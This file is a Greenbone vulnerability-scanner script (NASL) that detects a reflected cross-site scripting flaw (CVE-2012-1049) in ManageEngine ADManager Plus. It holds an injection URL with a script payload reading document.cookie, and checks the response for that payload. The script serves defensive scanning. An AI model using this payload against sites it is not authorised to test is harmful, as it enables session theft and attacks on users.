# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:zohocorp:manageengine_admanager_plus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802587");
  script_version("2021-09-27T14:27:18+0000");
  script_tag(name:"last_modification", value:"2021-09-27 14:27:18 +0000 (Mon, 27 Sep 2021)");
  script_tag(name:"creation_date", value:"2012-02-08 12:14:53 +0530 (Wed, 08 Feb 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2012-1049");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ManageEngine ADManager Plus Multiple XSS Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_manageengine_admanager_plus_consolidation.nasl");
  script_mandatory_keys("manageengine/admanager_plus/http/detected");
  script_require_ports("Services/www", 8080);

  script_tag(name:"summary", value:"ManageEngine ADManager Plus is prone to multiple cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'domainName' parameter
  in jsp/AddDC.jsp and 'operation' POST parameter in DomainConfig.do (when 'methodToCall' is set to
  'save') is not properly sanitised before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"ManageEngine ADManager Plus version 5.2 build 5210 and probably
  prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47887/");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/codes/admanager_xss.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109528/ZSL-2012-5070.txt");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5070.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = '/jsp/AddDC.jsp?domainName="><script>alert(document.cookie)</script>';

if (http_vuln_check(port: port, url: url, pattern:"><script>alert\(document\.cookie\)</script>", check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
